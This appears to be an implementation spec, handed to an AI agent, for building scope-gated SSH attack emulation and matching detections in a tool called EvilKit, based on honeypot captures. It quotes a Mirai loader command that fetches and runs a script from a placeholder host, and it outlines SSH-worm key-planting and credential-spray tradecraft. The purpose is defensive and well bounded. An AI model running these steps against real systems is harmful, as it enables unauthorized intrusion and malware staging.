# Plan — Honeypot-derived TTP emulation profile for EvilKit

**Author handoff note:** this is an implementation spec for another AI agent.
Build it *as adversary emulation inside EvilKit's existing scope-gated, evidence-first
model* — not as functional malware. Read the "Hard boundaries" section first; they are
acceptance criteria, not suggestions. If a step can't be done within them, stop and flag it.

---

## 1. Purpose

Convert the TTPs observed in the wild on the Cowrie SSH honeypot (`prod-db-01`,
18-day capture, 547k events) into a **purple-team capability** in EvilKit:

- **Red side** — a scope-gated emulation profile that reproduces each observed
  technique against *explicitly authorized lab targets*, with evidence capture.
- **Blue side** — the matching detection for each technique (we have the honeypot
  telemetry, so every emulation ships with the signal it should produce).

The pitch this supports: *"Here is what is actually hitting internet-facing SSH right
now; here is me emulating it under authorization; here is how you detect it."* That
demonstrates red-team understanding **and** defensive value — the Baidam audience.

Source evidence lives in `~/Projects/honeypot-osint/`:
`cowrie-logs/all.json`, `flowsint_graph.json`, `intel_summary.json`, `build_graph.py`.

---

## 2. Hard boundaries (acceptance criteria — all must hold)

1. **Emulation only, operator-driven.** Every action runs against a target that is
   present in `PENTEST_ALLOWED_TARGETS` of the session `.mcp.json` (EvilKit's existing
   scope gate). Fail closed off-scope, exactly like the launcher already does.
2. **No self-propagation. No autonomous target discovery. No mass-targeting.** The
   honeypot's "SSH worm" (C3) is emulated as a **single, operator-confirmed hop to one
   named authorized host** — never a loop that spreads. No scanning for new victims.
3. **No live malware payloads.** Do not fetch, rebuild, or run the captured Mirai/IoT
   binaries. Payloads are **inert emulation markers**: a script that writes a canary
   file and (optionally) beacons to a **lab-controlled sink the operator configures**,
   then exits. Never real C2, never a DDoS function, never a miner/proxyware.
4. **Everything is evidence.** Each module emits a structured record to EvilKit's session
   log / evidence dir, tagged with its ATT&CK technique ID and the honeypot artifact it
   derives from. Re-use the existing audit/evidence path, don't invent one.
5. **Lab-only, documented.** Each scenario states its authorization requirement and the
   expected blast radius. No default target. No egress except to the configured lab sink.

If any module cannot satisfy 1–5, it is dropped, not softened.

---

## 3. What to build (fits existing EvilKit conventions)

| Artifact | Path | Mirrors |
|---|---|---|
| Emulation run profile | `examples/honeypot-emulation-profile.toml` | `examples/keystone-run-profile.toml` |
| Technique taxonomy / scenario doc | `docs/techniques/honeypot-ssh-ttps.md` | new `docs/techniques/` dir |
| Inert emulation modules | `evilkit/emulation/<technique>.py` | new `emulation/` subpackage |
| Detection pack (blue half) | `docs/detections/honeypot-ssh.md` | new `docs/detections/` dir |
| Tests | `tests/test_emulation_*.py` | existing `tests/` |

The modules should be **declarative where possible**: a module describes the technique,
the inert action, the ATT&CK ID, the required scope, and the evidence it emits — so the
EvilKit agent executes it the same way it executes any other scoped step.

---

## 4. The mapping — 5 campaigns → ATT&CK → emulation + detection

For each: **Observed** (from the honeypot) · **Emulate** (inert, scoped) · **Detect**.

### C1 — Mirai "handshakebins" loader  *(Critical)*
- **ATT&CK:** T1110 Brute Force · T1021.004 SSH · T1059.004 Unix Shell · T1105 Ingress
  Tool Transfer (multi-protocol: wget/curl/tftp/ftp) · T1036.005 Masquerading
  (`kworker` name) · T1070.004 Indicator Removal (`rm -rf`) · T1498 Network DoS *(intent only)*.
- **Observed:** `cd /tmp||cd /var/run…; wget/curl/tftp/ftpget <host>/handshakebins.sh; chmod; sh; rm`.
- **Emulate:** scoped SSH to authorized host → attempt file transfer over each protocol
  (wget/curl/tftp/ftp) pulling an **inert marker** from the lab sink → write canary to
  `/tmp` under a `kworker`-style name → self-delete. Records which transfer methods the
  target permitted (that's the useful recon output).
- **Detect:** multi-protocol fetch to `/tmp` + chmod + immediate unlink; process named
  `kworker` not parented by kthreadd; outbound to non-repo IP on 80/tftp from a shell session.

### C2 — Multi-arch "iran" IoT dropper  *(High)*
- **ATT&CK:** T1105 · T1059.004 · T1588.001 (multi-arch tooling) · open-dir = operator opsec.
- **Observed:** `cat.sh` + `iran.{x86_64,aarch64,m68k}` from Vultr hosts; one left an open directory.
- **Emulate:** scoped fetch of an inert marker named per the target's detected arch
  (`uname -m`), to show arch-aware staging. No binary executes.
- **Detect:** architecture-probing (`uname -m`) immediately followed by arch-matched
  download; HTTP fetch of an open-directory index.

### C3 — Self-propagating SSH worm  *(Critical — handle with most care)*
- **ATT&CK:** T1552.004 Private Keys · T1098.004 SSH Authorized Keys · T1021.004 SSH
  (lateral) · T1562.001 Impair Defenses (`StrictHostKeyChecking no`) · T1105.
- **Observed:** plants a hardcoded ed25519 key, writes an SSH config disabling host-key
  checking, `scp`s a second stage from C2, falls back to wget/curl.
- **Emulate (single hop, operator-confirmed):** against **one** authorized host already in
  scope, demonstrate key-reuse lateral movement: use an operator-provided test key to open
  one SSH session, drop a canary, record success. **No loop, no discovery, no re-spread** —
  the module must refuse to act on any host not explicitly named for this run.
- **Detect:** new entry in `authorized_keys`; SSH client config with host-key checking
  disabled; `scp`/`sftp` pulling an executable right after login; lateral SSH using a key
  seen on a prior compromised host (the key-reuse signal).

### C4 — Open-relay / SOCKS abuse  *(Medium)*
- **ATT&CK:** T1572 Protocol Tunneling · T1090 Proxy.
- **Observed:** 12,744 `direct-tcpip` tunnel attempts through the box to Yahoo/Google/Cloudflare.
- **Emulate:** from a scoped session, open an SSH `direct-tcpip` channel to a **lab-controlled**
  endpoint only, to prove the box would relay. Never tunnel to third-party hosts.
- **Detect:** `direct-tcpip` requests on a server that should not proxy; outbound 80/443
  from the sshd session to many external hosts; relay volume anomaly.

### C5 — Windows RDP tooling drop  *(Medium — document, lower priority)*
- **ATT&CK:** T1021.001 RDP · T1105 · T1496 Resource Hijacking (proxyware/miner).
- **Observed:** `rdpcIip.exe`, `sqhost.exe`, 7-Zip self-extractors.
- **Emulate:** likely out of scope for an SSH-focused lab; document the technique + detection
  rather than build it, unless a Windows lab target exists in scope.
- **Detect:** 7z self-extractor writing to `%TEMP%`; unsigned `*.exe` staged post-RDP-logon;
  proxyware process beaconing.

### Ambient (the noise floor, worth one module)
- **ATT&CK:** T1595 Active Scanning · T1110 Brute Force.
- **Observed:** 88k `SSH-2.0-Go` sessions, `admin:admin` ×5,434, standard root dictionary.
- **Emulate:** scoped credential-spray with a *small, declared* wordlist against an authorized
  host — rate-limited, logged. **Not** a large brute-force; this is to exercise detection.
- **Detect:** high auth-failure rate per source; known-bad client version / HASSH fingerprint.

---

## 5. Run profile shape (`examples/honeypot-emulation-profile.toml`)

Model on `keystone-run-profile.toml`. Include at minimum:
- a `[scope]` block that requires explicit targets (no default) and inherits the `.mcp.json` gate;
- a `[sink]` block for the operator's lab marker/beacon endpoint (required; no default);
- an ordered `[[technique]]` list referencing the modules, each with `attack_id`,
  `honeypot_source` (the evidence file/line), `requires_confirm = true` for C3, and
  `evidence = true`.

---

## 6. Build order

1. `docs/techniques/honeypot-ssh-ttps.md` — the mapping above, expanded, as the spec of record.
2. `evilkit/emulation/` subpackage + base class (scope check, evidence emit, inert-marker helper, sink client).
3. Modules C1, C4, ambient first (lowest risk). Then C2. Then C3 behind the single-hop/confirm guard. C5 doc-only.
4. `examples/honeypot-emulation-profile.toml`.
5. `docs/detections/honeypot-ssh.md` — Sigma-style rules (and Cowrie/Zeek/auditd notes) per technique.
6. `tests/` — assert: off-scope target refused; no egress except sink; C3 refuses un-named hosts;
   every module emits an evidence record with its ATT&CK ID.

## 7. Done when
- Running the profile against an authorized lab host produces an evidence trail mapping each
  action to an ATT&CK ID and a honeypot source artifact;
- every boundary in §2 is enforced by code and covered by a test;
- the detection pack has a rule for every emulated technique;
- `README`/`docs` link the profile and credit the honeypot as the evidence source.
